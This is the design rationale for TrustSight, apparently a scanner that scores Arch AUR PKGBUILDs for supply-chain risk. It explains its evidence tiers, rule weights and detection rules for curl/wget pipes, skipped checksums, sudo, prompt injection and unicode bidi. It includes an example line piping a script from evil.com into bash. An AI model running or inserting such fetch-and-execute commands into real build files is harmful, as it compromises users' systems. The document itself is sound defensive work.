# Scoring Philosophy

The scoring system is designed around a single question: *how much new information does each signal carry?* Signals that fire on every package carry zero information. Signals that rarely fire and correlate with known threats carry the most.

## Evidence tiers (A/B/C/D)

Signals are grouped into four tiers:

| Tier | Basis | Availability | Example |
|------|-------|-------------|---------|
| **A : Structural** | Static analysis of the PKGBUILD | Always, no corpus needed | `curl \| bash`, base64 decode, variable source URL |
| **B : Priors** | Corpus classification of URLs | Always (corpus is bundled/primed) | `trusted_forge`, `official`, `unknown`, `homograph` |
| **C : History/Novelty** | Observation counts across corpus | Requires warm corpus (≥50 observations for full weight) | URL first seen globally, first seen in this package, new maintainer |
| **D : Verification** | Cryptographic integrity metadata | Always | Checksum present, PGP key pinned, GPG signature |

Structural signals (A) are always weighted; they don't depend on any external data. Context signals (B) depend on corpus coverage but work from first run because the domain list is pre-built. History signals (C) require observation; they are definitionally meaningless on run one. Verification signals (D) subtract rather than add because they mitigate risk.

## Why verification subtracts (not adds)

The naive design (described in the Dropbox paper that inspired the tool) scored checksum-missing packages *higher*. This meant:

- A package **with** checksums scored **higher** than one without.
- A package with no checksums and no other signals scored **0** (clean).

This is inverted. Verification presence is risk mitigation, not risk evidence. TrustSight fixes this by making verification a subtraction from the base score:

| Signal | Effect |
|--------|--------|
| `checksum_present` | −10 |
| `validpgpkeys` | −10 |
| `gpg_signature` | −5 |

A package with checksums starts at −10, and only positive signals (new URLs, curl|bash, untrusted source bucket) push it up.

## Severity weights

Each rule carries a severity weight, derived from its information value:

| Severity | Weight |
|----------|--------|
| CRITICAL | 40 |
| HIGH | 25 |
| MEDIUM | 15 |
| LOW | 5 |
| INFO | 0 |

FATAL rules are special: they set the score to 100 and contribute zero weight. If a FATAL rule fires, the score is 100 regardless of other signals.

## Pinning and source buckets

Pinning metadata reduces the score because it constrains the supply-chain attack surface:

| Modifier | Effect |
|----------|--------|
| `checksum_pinned` | −5 |
| `tag_pinned` | −3 |

Source bucket classification adjusts the score based on the integrity guarantees of the source:

| Bucket | Effect | Rationale |
|--------|--------|-----------|
| `trusted_forge` | −10 | GitHub, GitLab : platform integrity guarantees |
| `official` | 0 | Upstream official domains : neutral |
| `unknown` | +20 | Unrecognised domain : requires scrutiny |
| `homograph` | +30 | Visually confusable domain : high risk |

## Why popularity/votes are never a positive signal

The threat model is inverted. Compromise targets the popular. A widely-used package with thousands of votes is *more* valuable as a compromise target, not less. The xz utils lesson: the most dangerous backdoor in recent history targeted a widely-trusted, widely-used library. Popularity is not safety.

## Why maintainer identity is a change-detection key, never a reputation credential

Same lesson. A change of maintainer is a flag for investigation; it means the package is under new control. It is not a negative score by itself. Maintainer identity is tracked as a change-detection signal, not a reputation credential.

## Why weights are derived from corpus frequency, not asserted

R006 (certain source-array patterns) was originally classified as HIGH/25. Corpus analysis showed it fires on >30% of all AUR packages; it's a census, not a signal. It was demoted to LOW/5. Every weight is validated against corpus frequency. A rule that fires on most packages is not signalling anything useful.

## Rule design decisions

### R001 and R002: why separate rules for curl and wget

Curl and wget are the two most common tools for fetching remote content in PKGBUILDs. Combining them into a single rule would make it harder to tune: a user who accepts wget pipe patterns but wants to block curl pipe patterns would have to disable the combined rule entirely. Separate rules per tool let users choose which network tools to allow.

Matched against resolved strings because the URL or flags might be in a variable. The pattern catches the pipe to a shell, not just the presence of curl or wget alone.

### R012 and R013: why FATAL instead of CRITICAL

FATAL rules (R012 prompt injection, R013 unicode bidi) are fundamentally different from CRITICAL rules. A CRITICAL rule like `curl | bash` fires on a specific command pattern that is almost always malicious. A FATAL rule fires on a pattern that, when present, indicates active manipulation of the reviewer's perception.

Prompt injection and unicode bidi overrides are attacks on the reviewer, not on the build process. They attempt to hide what the PKGBUILD does. When these fire, the score hard-stops at 100 because a package that tries to deceive the reviewer cannot be trusted regardless of other signals. The 0 weight means they contribute nothing to the additive score; the hard stop is their entire effect.

Low recall is acceptable for these rules. R012 has 17% recall on the benchmark corpus. It is a tripwire: when it fires, the package is almost certainly malicious. When it does not, nothing can be concluded. The primary defence against prompt injection is the verdict-integrity assertions in the LLM translation stage, not the rule itself.

### R004 and R005: why checksum rules are hard-coded

Checksum integrity is foundational to the entire scoring system. Every other signal is evaluated in the context of whether checksums are present or disabled. Allowing users to disable R004 or R005 through `rules.toml` would produce misleading results: a package with `sha256sums=('SKIP')` that otherwise looks clean would score 0, but the missing checksum is itself a risk.

These rules are hard-coded in `src/trustsight/analysis.py` and cannot be disabled through configuration. R004 has automatic justification detection: if the diff contains a VCS source (`git+https://`, `.git`), a signature file (`.sig`, `.asc`), a `validpgpkeys` declaration, or a DKMS reference, the severity is downgraded from HIGH (weight 25) to INFO (weight 0). The justification checks whether the checksum skip is structurally explained, not whether it is safe.

### R009: why sudo detection is scoped to function_body

A naive `sudo` rule that matches anywhere in the PKGBUILD would fire on comments, examples in the `pkgdesc()`, and top-level variable assignments like `groups=('sudo')`. The function_body scope restricts matching to the actual build functions (`build()`, `package()`, `check()`), where a `sudo` command would have real effect. This was a result of corpus fire-rate analysis showing that unfiltered sudo matching was a census signal.

### C001, C002, C003: why code rules exist

Code rules (C-series) enforce structural invariants that cannot be expressed as a single regex match. C001 fires when a checksum changed without a source URL change and without a version bump: the checksum changed but nothing else did, which is anomalous. C002 is the same check but with a version bump present: normal during routine updates, recorded for audit only. C003 fires when source URLs changed without a version bump.

These rules are hard-coded because they depend on comparing multiple parsed fields (checksum state, source URL set, pkgver value). Writing them as TOML patterns would require embedding logic in regex, which is fragile and unreadable. The C-series namespace also prevents users from accidentally disabling structural invariants that the scoring model depends on.

### Why match_target has two values

Rules matched against `resolved` strings see the post-variable-expansion PKGBUILD. This catches patterns where the malicious command is hidden behind a variable: `curl $url | $shell` in the diff line becomes `curl https://evil.com/hook.sh | bash` after resolution.

Rules matched against `raw_line` strings see the literal PKGBUILD text. This catches patterns in the structure of the PKGBUILD itself: a `sha256sums=('SKIP')` declaration, a unicode bidi override character in a string literal, or a `.install` file reference.

The two-target design exists because PKGBUILDs encode meaning in both their text (structure, declarations) and their resolved values (commands, URLs). A pattern like `sudo` is meaningful in the raw text (where it can be seen and reviewed) but meaningless when resolved (sudo is not a variable). A pattern like `curl | bash` is meaningful only after resolution (where the actual URL and shell are known).
